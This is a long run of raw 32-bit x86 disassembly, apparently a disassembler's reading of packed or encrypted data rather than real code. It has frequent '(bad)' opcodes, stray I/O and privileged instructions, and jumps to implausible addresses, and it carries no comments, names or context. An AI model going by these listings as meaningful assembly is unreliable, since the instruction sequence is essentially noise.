  41a177:	pop    edi
  41a178:	or     DWORD PTR [ecx-0x59],esi
  41a17b:	pop    ds
  41a17c:	mov    ebx,0x6913865a
  41a181:	sbb    eax,0x7263b805
  41a186:	mov    edx,0x30f3f3f6
  41a18b:	fcom   QWORD PTR [ebx+0x8e0ced]
	...
  41a1f1:	add    BYTE PTR [eax],al
  41a1f3:	add    BYTE PTR [esp+ecx*1],bl
  41a1f6:	std    
  41a1f7:	sbb    ebp,edi
  41a1f9:	stc    
  41a1fa:	cld    
  41a1fb:	or     eax,0x398d6850
  41a200:	jp     0x41a1c6
  41a202:	mov    cl,0xc8
  41a204:	in     al,0x14
  41a206:	add    DWORD PTR [eax],eax
  41a208:	add    al,0x1
  41a20a:	add    BYTE PTR [eax],al
  41a20c:	dec    eax
  41a20d:	dec    edx
  41a20e:	lods   eax,DWORD PTR ds:[esi]
  41a20f:	into   
  41a210:	std    
  41a211:	and    DWORD PTR [ebp-0x37],ebp
  41a214:	xor    DWORD PTR ds:0xddbb7b91,ebx
  41a21a:	xor    BYTE PTR [esi+0x5],0x23
  41a21e:	push   cs
  41a21f:	xchg   esp,eax
  41a221:	(bad)  
  41a224:	inc    ecx
  41a225:	xlat   BYTE PTR ds:[ebx]
  41a226:	mov    eax,ds:0xdda5e91b
  41a22b:	cmp    al,BYTE PTR [esi+0x7793f431]
  41a231:	popa   
  41a232:	cmp    edx,DWORD PTR ds:0x4774dba4
  41a238:	adc    edx,DWORD PTR [edi-0xfca1225]
  41a23e:	dec    ebx
  41a23f:	aaa    
  41a240:	daa    
  41a241:	dec    ebx
  41a242:	int    0x38
  41a244:	stc    
  41a245:	in     eax,dx
  41a246:	xor    ebp,DWORD PTR [edi]
  41a248:	aas    
  41a249:	mov    ch,0x9c
  41a24b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a24c:	push   esi
  41a24d:	bound  edx,QWORD PTR [ebx-0x2bde77eb]
  41a253:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a254:	jmp    0x4b52c5df
  41a259:	cmc    
  41a25a:	sub    ah,cl
  41a25c:	cmp    dh,BYTE PTR [ebp+0x61191b02]
  41a262:	rol    bl,0x6c
  41a265:	fdivr  DWORD PTR [eax]
  41a267:	sub    BYTE PTR [edx-0x3c1bf858],0x5e
  41a26e:	sub    ebp,ebp
  41a270:	xor    DWORD PTR [ebx+0x2d8e0350],0x39d925d9
  41a27a:	daa    
  41a27b:	(bad)  
  41a27c:	cmp    DWORD PTR [edi+0x3d16f220],ebp
  41a282:	(bad)  
  41a283:	sub    eax,0x944ba170
  41a288:	xchg   BYTE PTR [esi+0x1ce1fcdc],al
  41a28e:	js     0x41a290
  41a290:	add    al,0x33
  41a292:	clc    
  41a293:	xchg   ebx,eax
  41a294:	xor    DWORD PTR ds:0x7342e6ab,ebp
  41a29a:	(bad)  
  41a29b:	sub    edi,DWORD PTR [edx]
  41a29d:	push   cs
  41a29e:	add    edx,DWORD PTR [ebp-0x2c]
  41a2a1:	xchg   edi,eax
  41a2a2:	cmc    
  41a2a3:	dec    edx
  41a2a4:	xor    ch,al
  41a2a6:	mov    al,0xfa
  41a2a8:	imul   DWORD PTR [edi]
  41a2aa:	push   edx
  41a2ab:	jo     0x41a28b
  41a2ad:	in     al,dx
  41a2ae:	or     bl,bl
  41a2b0:	fld    DWORD PTR [ecx+0x75]
  41a2b3:	into   
  41a2b4:	mov    bh,0xe1
  41a2b6:	pop    edx
  41a2b7:	sub    DWORD PTR [edx+0x45],0x77
  41a2bb:	sbb    al,al
  41a2bd:	sub    al,0x2a
  41a2bf:	loop   0x41a321
  41a2c1:	adc    ebp,edi
  41a2c3:	call   0xa6d612c8
  41a2c8:	iret   
  41a2c9:	jmp    0xe7b3:0x6d9de12a
  41a2d0:	shr    BYTE PTR [esi-0x7eccb5eb],cl
  41a2d6:	and    ebx,esi
  41a2d8:	sbb    al,0xf2
  41a2da:	xchg   edx,eax
  41a2db:	cli    
  41a2dc:	pusha  
  41a2dd:	shl    DWORD PTR [edi],1
  41a2df:	mov    gs,WORD PTR [esi]
  41a2e1:	ret    0xa7b8
  41a2e4:	idiv   DWORD PTR [edi]
  41a2e6:	je     0x41a35f
  41a2e8:	stc    
  41a2e9:	xor    eax,edi
  41a2eb:	jb     0x41a358
  41a2ed:	les    edx,FWORD PTR [eax-0x5]
  41a2f0:	xchg   edi,eax
  41a2f1:	je     0x41a285
  41a2f3:	imul   edx,ebp,0x4a
  41a2f6:	neg    eax
  41a2f8:	dec    ebp
  41a2f9:	loopne 0x41a301
  41a2fb:	lahf   
  41a2fc:	cwde   
  41a2fd:	xor    BYTE PTR [eax+ebx*4-0xb50fa86],bl
  41a304:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a305:	cdq    
  41a306:	mov    bl,0x76
  41a308:	(bad)  
  41a309:	xchg   ebx,eax
  41a30a:	dec    BYTE PTR [edi]
  41a30c:	sub    edi,DWORD PTR [eax+0xcd9f]
	...
  41a372:	add    BYTE PTR [eax],al
  41a374:	neg    DWORD PTR [eax-0x58]
  41a377:	adc    ebp,DWORD PTR [edi+0x15fcfff3]
  41a37d:	pop    esp
  41a37e:	xchg   ebp,eax
  41a37f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a380:	rcr    dl,cl
  41a382:	arpl   WORD PTR [ecx+0x115e8],ax
  41a388:	add    al,0x1
  41a38a:	add    BYTE PTR [eax],al
  41a38c:	test   BYTE PTR ds:[esi-0x12d9799c],cl
  41a393:	shl    DWORD PTR [eax-0x3a7a0b4],0xce
  41a39a:	(bad)  
  41a39b:	rcl    BYTE PTR [edx+0x61d69c21],0xc4
  41a3a2:	scas   al,BYTE PTR es:[edi]
  41a3a3:	or     ebp,DWORD PTR [eax]
  41a3a5:	xlat   BYTE PTR ds:[ebx]
  41a3a6:	mov    ah,0x53
  41a3a8:	test   DWORD PTR [edi-0x5b],edx
  41a3ab:	int    0x32
  41a3ad:	adc    DWORD PTR [edi-0x4d7c33f9],eax
  41a3b3:	pop    ecx
  41a3b4:	inc    esi
  41a3b5:	mov    al,ds:0x201dd988
  41a3ba:	stos   DWORD PTR es:[edi],eax
  41a3bb:	add    DWORD PTR [edx+0x564f05ca],ecx
  41a3c1:	inc    edi
  41a3c2:	std    
  41a3c3:	fsubr  DWORD PTR [ebx+0x3c]
  41a3c6:	adc    eax,0xab1112b
  41a3cb:	xchg   esi,eax
  41a3cc:	popf   
  41a3cd:	popfw  
  41a3cf:	pop    edx
  41a3d0:	xor    eax,0x1dfb86d0
  41a3d5:	pop    eax
  41a3d6:	into   
  41a3d7:	cli    
  41a3d8:	mov    edi,0xbb2d4a4b
  41a3dd:	cmp    edx,ebp
  41a3df:	pop    ebp
  41a3e0:	cld    
  41a3e1:	xchg   dh,dh
  41a3e3:	inc    esi
  41a3e4:	push   0xffffffae
  41a3e6:	in     eax,dx
  41a3e7:	cmp    dh,al
  41a3e9:	cmp    edi,eax
  41a3eb:	and    ah,BYTE PTR [ecx-0x2e99ee95]
  41a3f1:	inc    eax
  41a3f2:	mov    bh,0x92
  41a3f4:	xchg   ebx,eax
  41a3f5:	stc    
  41a3f6:	sub    ecx,DWORD PTR [esi+0x1c5c96f6]
  41a3fc:	xchg   edx,eax
  41a3fd:	mov    WORD PTR [edx+0x121003c9],ds
  41a403:	aad    0xf7
  41a405:	and    bl,BYTE PTR [ebp-0x35]
  41a408:	std    
  41a409:	iret   
  41a40a:	push   esp
  41a40b:	loope  0x41a449
  41a40d:	and    eax,0x129150bf
  41a412:	adc    al,0x45
  41a414:	jg     0x41a3dd
  41a416:	cmp    eax,0xb2ee1fcf
  41a41b:	push   esp
  41a41c:	not    BYTE PTR [eax]
  41a41e:	or     al,0xf5
  41a420:	loopne 0x41a43e
  41a422:	repnz cmp al,0x1a
  41a425:	sub    al,0xd6
  41a427:	mov    edi,0xaa04ab8c
  41a42c:	jmp    0xb6ab0f71
  41a431:	or     eax,0x2a18081b
  41a436:	dec    ebx
  41a437:	or     al,0xa8
  41a439:	mov    ebx,0xe23752a
  41a43e:	xchg   edx,eax
  41a43f:	lock dec ebx
  41a441:	cmp    eax,0x332d1bb3
  41a446:	shl    DWORD PTR [eax+0x1a939857],1
  41a44c:	das    
  41a44d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a44e:	sub    al,0xc3
  41a450:	jg     0x41a468
  41a452:	icebp  
  41a453:	mov    bh,0xcd
  41a455:	dec    edx
  41a456:	es pop eax
  41a458:	jecxz  0x41a44b
  41a45a:	jle    0xdaed1732
  41a460:	lahf   
  41a461:	and    esi,DWORD PTR [eax-0x1b15fde6]
  41a467:	lods   eax,DWORD PTR ds:[esi]
  41a468:	push   ss
  41a469:	pop    edx
  41a46a:	out    dx,eax
  41a46b:	xor    dl,ah
  41a46d:	adc    ecx,ebx
  41a46f:	cmc    
  41a470:	ja     0x41a435
  41a472:	or     al,0xf
  41a474:	jle    0x41a49d
  41a476:	sbb    BYTE PTR [edi+0x64],cl
  41a479:	push   ecx
  41a47a:	lea    ecx,[eax-0x4b]
  41a47d:	fcomp  DWORD PTR [eax-0x6e]
  41a480:	xchg   cl,ch
  41a482:	retf   
  41a483:	mov    edi,edx
  41a485:	sbb    al,0x73
  41a487:	or     eax,0x37a39a46
  41a48c:	sub    BYTE PTR [esp+ecx*2-0x17],0x0
	...
  41a4f1:	add    BYTE PTR [eax],al
  41a4f3:	add    BYTE PTR [edi-0xf0307e],bh
  41a4f9:	dec    edi
  41a4fa:	push   DWORD PTR [edx+0x5f4d0d09]
  41a500:	push   ecx
  41a501:	hlt    
  41a502:	sub    DWORD PTR [ecx+0x116ec],0x4
  41a509:	add    DWORD PTR [eax],eax
  41a50b:	add    BYTE PTR [eax],ch
  41a50d:	lods   eax,DWORD PTR ds:[esi]
  41a50e:	es pushf 
  41a510:	or     edi,DWORD PTR fs:[eax+eiz*8]
  41a514:	(bad)  
  41a515:	cmp    bh,BYTE PTR [ecx]
  41a517:	iret   
  41a518:	std    
  41a519:	push   0x4a
  41a51b:	sub    BYTE PTR ds:0x993c5e85,ch
  41a521:	add    DWORD PTR [edx-0x20b0015a],edx
  41a527:	loop   0x41a50e
  41a529:	push   cs
  41a52a:	inc    esi
  41a52b:	mov    dh,al
  41a52d:	lock adc dl,bh
  41a530:	jno    0x41a4b2
  41a532:	jae    0x41a4d5
  41a534:	mov    al,BYTE PTR [edi+0x295d9c15]
  41a53a:	sub    eax,0x3721af5f
  41a53f:	sbb    BYTE PTR [ebx+0x74],0x62
  41a543:	jmp    0xb448d021
  41a548:	adc    cl,BYTE PTR [ecx]
  41a54a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a54b:	cmp    dh,ch
  41a54d:	jg     0x41a519
  41a54f:	shl    DWORD PTR [edi-0x39],1
  41a552:	inc    ebp
  41a553:	icebp  
  41a554:	xor    BYTE PTR [ebp+0x59e53933],al
  41a55a:	dec    eax
  41a55b:	ja     0x41a55a
  41a55d:	pop    ds
  41a55e:	popf   
  41a55f:	out    dx,eax
  41a560:	call   FWORD PTR [esi]
  41a562:	aad    0x7a
  41a564:	loopne 0x41a554
  41a566:	or     BYTE PTR [edi+0x1168c8a2],ch
  41a56c:	cdq    
  41a56d:	popa   
  41a56e:	or     al,0x3b
  41a570:	test   ebp,ecx
  41a572:	mov    al,BYTE PTR [esi+ecx*1]
  41a575:	mov    eax,ds:0x51d70d55
  41a57a:	pop    esi
  41a57b:	push   esi
  41a57c:	or     eax,0x6ed2949f
  41a581:	xor    DWORD PTR [ebx],0x67
  41a584:	icebp  
  41a585:	jmp    DWORD PTR [ebp-0x62]
  41a588:	repz hlt 
  41a58a:	and    al,0xc8
  41a58c:	shl    DWORD PTR ds:0xc0735fb5,cl
  41a592:	cdq    
  41a593:	cs pop es
  41a595:	jbe    0x41a5ac
  41a597:	loope  0x41a53a
  41a599:	xchg   ecx,eax
  41a59a:	and    al,0x1f
  41a59c:	sahf   
  41a59d:	fwait
  41a59e:	push   ss
  41a59f:	mov    ds:0x529a3ae2,eax
  41a5a4:	mov    WORD PTR [edx],?
  41a5a6:	adc    DWORD PTR [ebp+0x5c],ecx
  41a5a9:	push   eax
  41a5aa:	(bad)  
  41a5ab:	fld    TBYTE PTR [esi-0x529c6f3]
  41a5b1:	les    ecx,FWORD PTR [esi]
  41a5b3:	and    al,al
  41a5b5:	std    
  41a5b6:	sub    esp,edx
  41a5b8:	sbb    eax,0x21335fea
  41a5bd:	dec    ebx
  41a5be:	test   DWORD PTR [ecx-0x34],esp
  41a5c1:	sahf   
  41a5c2:	std    
  41a5c3:	xor    bh,0xc6
  41a5c6:	cmp    bl,al
  41a5c8:	sbb    BYTE PTR [edx-0x64],ah
  41a5cb:	scas   al,BYTE PTR es:[edi]
  41a5cc:	jg     0x41a625
  41a5ce:	dec    esi
  41a5cf:	ss mov ebx,0x6e71eabe
  41a5d5:	xchg   ecx,eax
  41a5d6:	sahf   
  41a5d7:	lods   eax,DWORD PTR ds:[esi]
  41a5d8:	add    DWORD PTR es:[ecx+0x45e56c3e],esi
  41a5df:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a5e0:	scas   al,BYTE PTR es:[edi]
  41a5e1:	add    eax,0x9ca2c65a
  41a5e6:	dec    esp
  41a5e7:	std    
  41a5e8:	add    ebx,DWORD PTR [edx-0x741773eb]
  41a5ee:	cmp    al,BYTE PTR [eax-0x45]
  41a5f1:	aas    
  41a5f2:	fcomp  DWORD PTR [eax-0x4a]
  41a5f5:	adc    eax,0xd8e4641a
  41a5fa:	xor    DWORD PTR [esi-0x673fc476],0xe7a6f4f8
  41a604:	mov    ch,BYTE PTR [ebx+0xd683ba6]
  41a60a:	adc    DWORD PTR [ecx+0x55eadcbe],ebx
	...
  41a674:	pop    esp
  41a675:	sub    al,BYTE PTR [ecx]
  41a677:	inc    ecx
  41a678:	ja     0x41a6e5
  41a67a:	pop    esp
  41a67b:	aas    
  41a67c:	dec    ecx
  41a67d:	push   0xc5dfa625
  41a682:	out    dx,eax
  41a683:	in     al,dx
  41a684:	lock pop ss
  41a686:	add    DWORD PTR [eax],eax
  41a688:	add    al,0x1
  41a68a:	add    BYTE PTR [eax],al
  41a68c:	adc    BYTE PTR [esp+eax*8],0xfc
  41a690:	mov    eax,0x18c2a0df
  41a695:	and    eax,0xe9e5a177
  41a69a:	cmp    ebp,ecx
  41a69c:	push   0x8788cc39
  41a6a1:	pop    ds
  41a6a2:	add    ebp,ebx
  41a6a4:	sub    bl,bl
  41a6a6:	imul   ecx,eax,0x2a
  41a6a9:	push   0xffffffc0
  41a6ab:	(bad)  
  41a6ac:	mov    edx,0x9999fd8
  41a6b1:	cdq    
  41a6b2:	and    al,0x9c
  41a6b4:	sub    esi,ecx
  41a6b6:	lock mov esi,0x37a05e7d
  41a6bc:	ds push ebp
  41a6be:	out    0xa9,eax
  41a6c0:	outs   dx,BYTE PTR ds:[esi]
  41a6c1:	mov    WORD PTR [ebx],?
  41a6c3:	ins    BYTE PTR es:[edi],dx
  41a6c4:	sbb    DWORD PTR [ebx+0x1648e943],0xc48a8c48
  41a6ce:	jbe    0x41a6cd
  41a6d0:	sub    al,0xe9
  41a6d2:	bound  esp,QWORD PTR [ecx]
  41a6d4:	out    dx,eax
  41a6d5:	(bad)  
  41a6d6:	out    0xc4,eax
  41a6d8:	sbb    DWORD PTR [eax-0x742f5b39],ebx
  41a6de:	adc    edi,ecx
  41a6e0:	cmp    al,0xa2
  41a6e2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a6e3:	fst    QWORD PTR [esp+edx*8]
  41a6e6:	mov    bl,BYTE PTR [ebp-0x53d0357a]
  41a6ec:	push   ds
  41a6ed:	call   0x25678f72
  41a6f2:	in     al,0x52
  41a6f4:	dec    ebp
  41a6f5:	ins    DWORD PTR es:[edi],dx
  41a6f6:	or     eax,0xa73c8a19
  41a6fb:	push   ebp
  41a6fc:	and    cl,BYTE PTR [ebx-0x6432d415]
  41a702:	jle    0x41a696
  41a704:	cs mov ebx,0xc70ccec1
  41a70a:	pushf  
  41a70b:	rcr    BYTE PTR [edi],cl
  41a70d:	lock xchg ebp,eax
  41a70f:	adc    ecx,edx
  41a711:	mov    al,0x58
  41a713:	in     al,dx
  41a714:	mov    ah,0x6f
  41a716:	lods   eax,DWORD PTR ds:[esi]
  41a717:	(bad)  
  41a718:	push   ebp
  41a719:	dec    ebp
  41a71a:	dec    edx
  41a71b:	outs   dx,DWORD PTR ds:[esi]
  41a71c:	xchg   al,ch
  41a71e:	mov    es,WORD PTR [edi]
  41a720:	xor    BYTE PTR [ebp+0x3b355e23],dh
  41a726:	outs   dx,BYTE PTR ds:[esi]
  41a727:	mov    cl,0x8b
  41a729:	cmp    BYTE PTR [ebx+0x2c],bl
  41a72c:	push   ss
  41a72d:	cmp    al,0xd0
  41a72f:	and    esp,DWORD PTR [esi]
  41a731:	sbb    bl,BYTE PTR [ecx-0x75621efe]
  41a737:	pop    ss
  41a738:	inc    edi
  41a739:	(bad)  
  41a73b:	inc    ebp
  41a73c:	push   eax
  41a73d:	dec    edx
  41a73e:	sbb    ah,BYTE PTR [ecx-0x57]
  41a741:	mov    cl,0xdb
  41a743:	or     eax,0x19a14525
  41a748:	(bad)  
  41a749:	fcmove st,st(2)
  41a74b:	mov    eax,0x5f6e57a4
  41a750:	or     al,0x20
  41a752:	dec    ebp
  41a753:	cmp    BYTE PTR [ebx-0x3e8aad4e],bh
  41a759:	mov    dh,0xb1
  41a75b:	sar    DWORD PTR [edi-0x75],0x7b
  41a75f:	jmp    0x82d0f13b
  41a764:	ret    
  41a765:	loop   0x41a7ad
  41a767:	push   es
  41a768:	add    BYTE PTR ds:0x7bfd88ff,ch
  41a76e:	lods   eax,DWORD PTR ds:[esi]
  41a76f:	iret   
  41a770:	shl    BYTE PTR [esi-0x6cad21a9],cl
  41a776:	cmp    bl,BYTE PTR [eax+0x40f2f333]
  41a77c:	cdq    
  41a77d:	dec    ebx
  41a77e:	add    BYTE PTR [ebx],0xba
  41a781:	sub    DWORD PTR [edx+0x18eb6331],esp
  41a787:	mov    ch,0x84
  41a789:	pusha  
  41a78a:	outs   dx,DWORD PTR ds:[esi]
  41a78b:	sti    
  41a78c:	dec    ecx
  41a78d:	mov    esp,0xf0e7
	...
  41a7f2:	add    BYTE PTR [eax],al
  41a7f4:	repz xchg edi,eax
  41a7f6:	jae    0x41a77f
  41a7f8:	ja     0x41a7e1
  41a7fa:	div    edi
  41a7fc:	mov    ds:0x525327ca,al
  41a801:	push   ss
  41a802:	mov    edi,0x118f4ea
  41a807:	add    BYTE PTR [ecx+eax*1],al
  41a80a:	add    BYTE PTR [eax],al
  41a80c:	fwait
  41a80d:	int3   
  41a80e:	jmp    0x292e05af
  41a813:	sub    al,0xa8
  41a815:	scas   al,BYTE PTR es:[edi]
  41a816:	addr16 pop ecx
  41a818:	inc    ebx
  41a819:	mov    edi,0xfe9e7c3f
  41a81e:	dec    edi
  41a81f:	xchg   BYTE PTR ds:0xcbc335e0,dl
  41a825:	adc    eax,0x54a1318
  41a82a:	cmp    bl,BYTE PTR [eax+edi*1]
  41a82d:	mov    dh,0x5
  41a82f:	lahf   
  41a830:	ror    BYTE PTR [ebx+eiz*2],cl
  41a833:	std    
  41a834:	cmp    al,0xe8
  41a836:	imul   esi,ebp,0x2b
  41a839:	push   edi
  41a83a:	jno    0x41a81d
  41a83c:	adc    BYTE PTR [eax+0x49],0x75
  41a840:	fcom   QWORD PTR [eax+0x55]
  41a843:	add    eax,0xc7a4e093
  41a848:	std    
  41a849:	push   ebx
  41a84a:	adc    ebp,DWORD PTR [esi]
  41a84c:	js     0x41a8b6
  41a84e:	jmp    0xdd051875
  41a853:	scas   al,BYTE PTR es:[edi]
  41a854:	test   eax,0xe664b858
  41a859:	pop    ecx
  41a85a:	in     eax,0x24
  41a85c:	push   es
  41a85d:	dec    ebx
  41a85e:	into   
  41a85f:	jae    0x41a810
  41a861:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a862:	in     eax,dx
  41a863:	cdq    
  41a864:	xchg   esi,eax
  41a865:	or     cl,BYTE PTR [edx+0x3]
  41a868:	mov    esp,0x79edaf2
  41a86d:	ja     0x41a8b1
  41a86f:	pop    ecx
  41a870:	jp     0x41a812
  41a872:	jb     0x41a8af
  41a874:	mov    cl,0xfe
  41a876:	and    al,al
  41a878:	push   0xffffffb7
  41a87a:	fstp   QWORD PTR [edx+0x5eb43a68]
  41a880:	cmc    
  41a881:	sbb    al,0x10
  41a883:	div    BYTE PTR [ebp+eax*4+0x2a]
  41a887:	inc    edi
  41a888:	adc    al,0xb4
  41a88a:	pop    ecx
  41a88b:	into   
  41a88c:	mov    bl,0x28
  41a88e:	jp     0x41a905
  41a890:	jb     0x41a823
  41a892:	ror    DWORD PTR [edi+edx*4],cl
  41a895:	std    
  41a896:	les    edx,FWORD PTR [edx]
  41a898:	push   eax
  41a899:	retf   0x27a9
  41a89c:	loop   0x41a8a5
  41a89e:	sti    
  41a89f:	xchg   ecx,eax
  41a8a0:	pop    esp
  41a8a1:	pop    ebx
  41a8a2:	mov    WORD PTR [ecx+ebx*8-0xe],?
  41a8a6:	test   al,0x6c
  41a8a8:	je     0x41a884
  41a8aa:	pop    ds
  41a8ab:	pop    ecx
  41a8ac:	fst    DWORD PTR [eax+0x57632f7d]
  41a8b2:	lods   eax,DWORD PTR ds:[esi]
  41a8b3:	dec    eax
  41a8b4:	xlat   BYTE PTR ds:[ebx]
  41a8b5:	mov    bh,0x48
  41a8b7:	fst    QWORD PTR [ecx]
  41a8b9:	add    dh,BYTE PTR [ebx-0x5a2fa3de]
  41a8bf:	jne    0x41a8d6
  41a8c1:	cmp    al,0xad
  41a8c3:	mov    esi,0x68ca37d0
  41a8c8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a8c9:	jnp    0x41a8ed
  41a8cb:	inc    esp
  41a8cc:	inc    esi
  41a8cd:	sub    ch,0xb8
  41a8d0:	mov    ah,0xf6
  41a8d2:	shl    al,cl
  41a8d4:	(bad)  
  41a8d5:	mov    al,0x75
  41a8d7:	outs   dx,BYTE PTR ds:[esi]
  41a8d8:	dec    ebx
  41a8d9:	xchg   edx,eax
  41a8da:	jne    0x41a8c5
  41a8dc:	add    eax,DWORD PTR [eax]
  41a8de:	sbb    BYTE PTR [edx+0x5550ac80],ch
  41a8e4:	cs mov cx,?
  41a8e8:	adc    al,0x94
  41a8ea:	int3   
  41a8eb:	invd   
  41a8ed:	and    DWORD PTR [edx],esi
  41a8ef:	mov    edx,0x9b57661a
  41a8f4:	(bad)  
  41a8f5:	mov    ds:0x3459c144,eax
  41a8fa:	mov    cl,0x87
  41a8fc:	popf   
  41a8fd:	sbb    DWORD PTR [ecx+0x1f],ebx
  41a900:	mov    ds:0x40075a58,eax
  41a905:	or     ebp,DWORD PTR [ebx-0x250877c0]
  41a90b:	lea    ebx,[eax+0xd738e1]
	...
  41a971:	add    BYTE PTR [eax],al
  41a973:	add    BYTE PTR ds:0xcf4a867e,dh
  41a979:	cli    
  41a97a:	std    
  41a97b:	jg     0x41a9cb
  41a97d:	push   edx
  41a97e:	pushf  
  41a97f:	dec    esp
  41a980:	jb     0x41a90e
  41a982:	sub    eax,0x119f8b0
  41a987:	add    BYTE PTR [ecx+eax*1],al
  41a98a:	add    BYTE PTR [eax],al
  41a98c:	cmp    al,0xbc
  41a98e:	mov    dh,0x3f
  41a990:	push   edi
  41a991:	dec    esp
  41a992:	pop    ebx
  41a993:	xchg   esi,eax
  41a994:	fdecstp 
  41a996:	(bad)  
  41a997:	imul   ecx,DWORD PTR ds:0x455e07c4,0xffffff9a
  41a99e:	popa   
  41a99f:	(bad)  
  41a9a0:	or     DWORD PTR [esi],edx
  41a9a2:	lods   al,BYTE PTR ds:[esi]
  41a9a3:	addr16 fsubrp st(4),st
  41a9a6:	outs   dx,DWORD PTR ds:[esi]
  41a9a7:	imul   ebx
  41a9a9:	dec    ebx
  41a9aa:	aad    0x46
  41a9ac:	(bad)  
  41a9ad:	xchg   esi,eax
  41a9ae:	or     DWORD PTR [ebx-0x30438871],eax
  41a9b4:	pop    es
  41a9b5:	ret    0xd63c
  41a9b8:	add    BYTE PTR [ebp-0x4b7ae40a],ch
  41a9be:	into   
  41a9bf:	clc    
  41a9c0:	imul   ecx,DWORD PTR [ebp-0x14c2cb3b],0xffffff9c
  41a9c7:	jle    0x41aa06
  41a9c9:	sub    DWORD PTR [edx-0x1f6e78bd],eax
  41a9cf:	aaa    
  41a9d0:	sahf   
  41a9d1:	mov    edx,0xf952c2b8
  41a9d6:	pop    eax
  41a9d7:	push   ss
  41a9d8:	neg    eax
  41a9da:	cmp    bh,0x93
  41a9dd:	add    ecx,DWORD PTR [ecx+0x5bc2278d]
  41a9e3:	(bad)  
  41a9e4:	int    0xe7
  41a9e6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a9e7:	(bad)
  41a9ea:	popa   
  41a9eb:	std    
  41a9ec:	sar    BYTE PTR [edi],1
  41a9ee:	fsubrp st(2),st
  41a9f0:	scas   eax,DWORD PTR es:[edi]
  41a9f1:	(bad)  
  41a9f2:	add    al,0x4f
  41a9f4:	imul   esi,DWORD PTR [edx-0xb],0x3f
  41a9f8:	jne    0x41a9a9
  41a9fa:	das    
  41a9fb:	dec    eax
  41a9fc:	mov    al,ds:0x59a6aceb
  41aa01:	xchg   esp,eax
  41aa02:	imul   edi,ebx,0x13fd86cb
  41aa08:	outs   dx,BYTE PTR ds:[esi]
  41aa09:	stc    
  41aa0a:	idiv   BYTE PTR [ebx]
  41aa0c:	push   esp
  41aa0d:	adc    eax,0x74159a28
  41aa12:	rol    DWORD PTR [ecx],1
  41aa14:	mov    ecx,edi
  41aa16:	dec    edx
  41aa17:	push   edi
  41aa18:	push   es
  41aa19:	sbb    al,0xe1
  41aa1b:	enter  0x44d5,0x79
  41aa1f:	mov    ah,0xce
  41aa21:	call   0xe105:0xdd21d6ac
  41aa28:	inc    ebp
  41aa29:	jns    0x41aa49
  41aa2b:	push   0x48
  41aa2d:	sub    eax,0x586f4c6f
  41aa32:	xchg   ecx,eax
  41aa33:	or     eax,0xee42a99a
  41aa38:	aaa    
  41aa39:	sbb    edi,DWORD PTR [edi]
  41aa3b:	popa   
  41aa3c:	jo     0x41aa8a
  41aa3e:	psrlw  mm4,QWORD PTR [esi+0x2f]
  41aa42:	adc    BYTE PTR [eax-0x16],al
  41aa45:	cli    
  41aa46:	sub    BYTE PTR [ebx+0x78],bh
  41aa49:	xlat   BYTE PTR ds:[ebx]
  41aa4a:	mov    eax,ds:0xcf30756c
  41aa4f:	in     eax,0x81
  41aa51:	fiadd  DWORD PTR [eax+0x3b9d6cb0]
  41aa57:	sub    BYTE PTR [eax],0x90
  41aa5a:	pop    esp
  41aa5b:	jg     0x41aa96
  41aa5d:	or     eax,0xe806da0a
  41aa62:	leave  
  41aa63:	push   0xffffffa9
  41aa65:	(bad)  
  41aa66:	lock jp 0x41aa74
  41aa69:	call   0x6b44:0x4b043804
  41aa70:	xchg   edx,eax
  41aa71:	hlt    
  41aa72:	fisub  WORD PTR [edx]
  41aa74:	out    dx,eax
  41aa75:	add    DWORD PTR [eax-0x39],0x37
  41aa79:	pop    edx
  41aa7a:	es pushf 
  41aa7c:	mov    al,ds:0xc301777c
  41aa81:	fidivr DWORD PTR [edx]
  41aa83:	mov    BYTE PTR [eax],al
  41aa85:	or     eax,DWORD PTR [edx]
  41aa87:	ins    BYTE PTR es:[edi],dx
  41aa88:	mov    ebp,0xc5a28fe4
  41aa8d:	retf   0xf69b
	...
  41aaf4:	test   DWORD PTR [ecx],0xfdfeb4dc
  41aafa:	inc    DWORD PTR [ebx+0x5f]
  41aafd:	sbb    BYTE PTR [esi+0x43],ah
  41ab00:	dec    BYTE PTR [ebx]
  41ab02:	sub    al,0xd5
  41ab04:	cld    
  41ab05:	sbb    al,BYTE PTR [ecx]
  41ab07:	add    BYTE PTR [ecx+eax*1],al
  41ab0a:	add    BYTE PTR [eax],al
  41ab0c:	enter  0x39c8,0xf6
  41ab10:	xor    dl,al
  41ab12:	out    0x4a,al
  41ab14:	in     eax,dx
  41ab15:	sbb    ch,BYTE PTR [edi-0x56]
  41ab18:	gs out dx,eax
  41ab1a:	mov    cl,0x85
  41ab1c:	xor    bh,BYTE PTR [ecx]
  41ab1e:	sub    BYTE PTR [esi-0x72e1ae7c],cl
  41ab24:	mov    esp,eax
  41ab26:	or     ah,al
  41ab28:	cmp    eax,0x6784b6c5
  41ab2d:	out    0xc9,al
  41ab2f:	dec    edx
  41ab30:	push   es
  41ab31:	push   es
  41ab32:	pop    ds
  41ab33:	xor    DWORD PTR cs:[ecx],ebx
  41ab36:	into   
  41ab37:	and    ebx,DWORD PTR [esi]
  41ab39:	shl    BYTE PTR [eax+0x6e],1
  41ab3c:	test   eax,0xe1953391
  41ab41:	test   BYTE PTR [edx-0x4513431a],0xcc
  41ab48:	stos   DWORD PTR es:[edi],eax
  41ab49:	push   ebx
  41ab4a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ab4b:	xor    edi,ecx
  41ab4d:	jbe    0x41ab56
  41ab4f:	mov    ds:0xe6b6f338,eax
  41ab54:	fs loope 0x41ab24
  41ab57:	test   al,0xe1
  41ab59:	stos   BYTE PTR es:[edi],al
  41ab5a:	jl     0x41ab5e
  41ab5c:	ins    DWORD PTR es:[edi],dx
  41ab5d:	and    eax,0xaa1ac665
  41ab62:	jo     0x41ab7c
  41ab64:	and    dl,BYTE PTR [esi-0x57]
